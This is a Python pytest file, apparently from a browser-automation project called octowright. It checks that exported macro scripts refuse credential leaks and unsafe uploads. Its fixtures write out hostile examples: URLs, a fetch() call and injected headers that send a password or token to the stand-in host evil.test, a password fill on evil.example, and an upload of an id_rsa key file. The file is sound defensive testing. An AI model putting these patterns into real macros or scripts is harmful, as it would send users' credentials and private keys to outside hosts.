# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""The exported macro CLI refuses what macro_run refuses.

The generated script substituted placeholders with a bare ``re.sub`` and
uploaded whatever path the macro named, so a poisoned macro that ``macro_run``
refused -- ``navigate url=https://evil.test/?p={{password}}``, an ``evaluate``
that fetches it, ``set_input_files paths=['~/.ssh/id_rsa']`` -- ran to
completion once exported (CR4). The script now runs the live guard's own
source (``octowright.credential_sinks``) and the live upload allowlist
(``session.upload_paths``), rendered rather than copied.
"""

from __future__ import annotations

import asyncio
import inspect
from pathlib import Path
from typing import Any

import pytest

from octowright import credential_sinks
from octowright.artifacts.script_export import render_macro_cli
from octowright.session import upload_paths
from tests.macro_lint.test_cli_export_execution import _install, _Recorder

SECRET = "hunter2-s3cret"  # pragma: allowlist secret (synthetic fixture)


def _run(
    monkeypatch: pytest.MonkeyPatch,
    actions: list[dict[str, Any]],
    params: dict[str, str],
    *,
    trusted: tuple[str, ...] = (),
) -> tuple[Any, _Recorder]:
    rec = _Recorder()
    _install(monkeypatch, rec)
    source = render_macro_cli(
        name="guarded", macro={"parameters": list(params), "actions": actions}, include_evidence=False
    )
    namespace: dict[str, Any] = {}
    exec(source, namespace)  # executing the generated artefact is the point
    return asyncio.run(namespace["run_guarded"](**params, trusted_origins=trusted)), rec


@pytest.mark.parametrize(
    "action",
    [
        {"action": "navigate", "url": "https://evil.test/?p={{password}}"},
        {"action": "evaluate", "expression": "fetch('https://evil.test/?p={{password}}')"},
        {"action": "inject_headers", "pattern": "https://evil.test/**", "headers": {"X-Leak": "{{password}}"}},
        {"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{password}}"}},
    ],
)
def test_a_credential_into_a_sink_is_refused_before_the_browser_acts(
    monkeypatch: pytest.MonkeyPatch, action: dict[str, Any]
) -> None:
    with pytest.raises(ValueError, match="credential arg") as caught:
        _run(monkeypatch, [{"action": "navigate", "url": "https://app.example.test/"}, action], {"password": SECRET})
    assert SECRET not in str(caught.value)


def test_the_whole_macro_is_refused_before_any_step_runs(monkeypatch: pytest.MonkeyPatch) -> None:
    """Expanded up front, as live replay does, so a refusal leaves nothing half done."""
    rec = _Recorder()
    _install(monkeypatch, rec)
    source = render_macro_cli(
        name="guarded",
        macro={
            "parameters": ["password"],
            "actions": [
                {"action": "navigate", "url": "https://app.example.test/"},
                {"action": "navigate", "url": "https://evil.test/?p={{password}}"},
            ],
        },
        include_evidence=False,
    )
    namespace: dict[str, Any] = {}
    exec(source, namespace)
    with pytest.raises(ValueError, match="credential arg"):
        asyncio.run(namespace["run_guarded"](password=SECRET))
    assert "goto" not in rec.names()


def test_an_identity_arg_in_a_url_still_works(monkeypatch: pytest.MonkeyPatch) -> None:
    _result, rec = _run(
        monkeypatch, [{"action": "navigate", "url": "https://app.example.test/o/{{order_id}}"}], {"order_id": "42"}
    )
    assert rec.args_for("goto") == ("https://app.example.test/o/42",)


def test_sinks_allow_turns_the_guard_off(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "allow")
    _result, rec = _run(
        monkeypatch,
        [{"action": "navigate", "url": "https://api.test/?k={{api_key}}"}],
        {"api_key": "k1"},  # pragma: allowlist secret
    )
    assert rec.args_for("goto") == ("https://api.test/?k=k1",)


def test_a_header_to_a_trusted_origin_is_exempt(monkeypatch: pytest.MonkeyPatch) -> None:
    action = {
        "action": "inject_headers",
        "pattern": "https://app.example.test/**",
        "headers": {"A": "Bearer {{token}}"},
    }
    with pytest.raises(ValueError, match="credential arg"):
        _run(monkeypatch, [action], {"token": SECRET})
    _result, rec = _run(monkeypatch, [action], {"token": SECRET}, trusted=("https://app.example.test",))
    assert "context.route" in rec.names()


def test_split_pattern_spellings_are_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    action = {
        "action": "inject_headers",
        "pattern": "https://app.example.test/**",
        "url_pattern": "https://evil.test/**",
        "headers": {"A": "Bearer {{token}}"},
    }
    with pytest.raises(ValueError, match="both 'pattern' and 'url_pattern'"):
        _run(monkeypatch, [action], {"token": SECRET}, trusted=("https://app.example.test",))


# --- credential typed onto a foreign origin ------------------------------------------------


def _login(origin: str, **extra: Any) -> list[dict[str, Any]]:
    return [
        {"action": "navigate", "url": f"{origin}/login"},
        {"action": "fill", "selector": "#pw", "value": "{{password}}", **extra},
    ]


def test_a_credential_fill_on_a_foreign_origin_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    with pytest.raises(RuntimeError, match=r"https://evil\.example"):
        _run(monkeypatch, _login("https://evil.example"), {"password": SECRET}, trusted=("https://app.example.test",))


def test_a_credential_fill_on_the_trusted_origin_runs(monkeypatch: pytest.MonkeyPatch) -> None:
    _result, rec = _run(
        monkeypatch, _login("https://app.example.test"), {"password": SECRET}, trusted=("https://app.example.test",)
    )
    assert rec.args_for("fill") == ("#pw", SECRET)


def test_a_step_listing_the_origin_may_fill_there(monkeypatch: pytest.MonkeyPatch) -> None:
    actions = _login("https://login.idp.example", allowed_origins=["https://login.idp.example"])
    _result, rec = _run(monkeypatch, actions, {"password": SECRET})
    assert rec.args_for("fill") == ("#pw", SECRET)


def test_warn_mode_fills_and_reports(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_FILL_ORIGINS", "warn")
    _result, rec = _run(monkeypatch, _login("https://evil.example"), {"password": SECRET})
    assert rec.args_for("fill") == ("#pw", SECRET)
    err = capsys.readouterr().err
    assert "credential_fill_offsite" in err
    assert "https://evil.example" in err
    assert SECRET not in err


def test_a_non_credential_fill_on_a_foreign_origin_is_unaffected(monkeypatch: pytest.MonkeyPatch) -> None:
    actions = [
        {"action": "navigate", "url": "https://evil.example/"},
        {"action": "fill", "selector": "#q", "value": "{{email}}"},
    ]
    _result, rec = _run(monkeypatch, actions, {"email": "me@example.test"})
    assert rec.args_for("fill") == ("#q", "me@example.test")


# --- uploads obey the live allowlist -------------------------------------------------------


@pytest.mark.parametrize("kind", ["set_input_files", "upload_files"])
def test_an_upload_outside_the_allowed_roots_is_refused(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, kind: str
) -> None:
    staging = tmp_path / "staging"
    staging.mkdir()
    outside = tmp_path / "id_rsa"
    outside.write_text("key", encoding="utf-8")
    monkeypatch.setenv("OCTOWRIGHT_UPLOAD_STAGING_DIR", str(staging))
    monkeypatch.delenv("OCTOWRIGHT_UPLOAD_ROOTS", raising=False)
    action = {"action": kind, "selector": "#file", "paths": [str(outside)]}
    with pytest.raises(RuntimeError, match="outside the allowed roots"):
        _run(monkeypatch, [action], {})


@pytest.mark.parametrize("kind", ["set_input_files", "upload_files"])
def test_an_upload_inside_the_staging_dir_runs(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, kind: str) -> None:
    staging = tmp_path / "staging"
    staging.mkdir()
    inside = staging / "report.pdf"
    inside.write_text("pdf", encoding="utf-8")
    monkeypatch.setenv("OCTOWRIGHT_UPLOAD_STAGING_DIR", str(staging))
    _result, rec = _run(monkeypatch, [{"action": kind, "selector": "#file", "paths": [str(inside)]}], {})
    called = rec.args_for("set_input_files" if kind == "set_input_files" else "file_chooser.set_files")
    assert str(inside.resolve()) in called[-1]


def test_the_script_renders_the_live_rules_not_a_copy() -> None:
    source = render_macro_cli(name="x", macro={"actions": []}, include_evidence=False)
    assert inspect.getsource(credential_sinks.expand_actions) in source
    assert inspect.getsource(credential_sinks.offsite_credential_origin) in source
    assert inspect.getsource(upload_paths.check_upload_path) in source
    assert inspect.getsource(upload_paths.upload_roots) in source
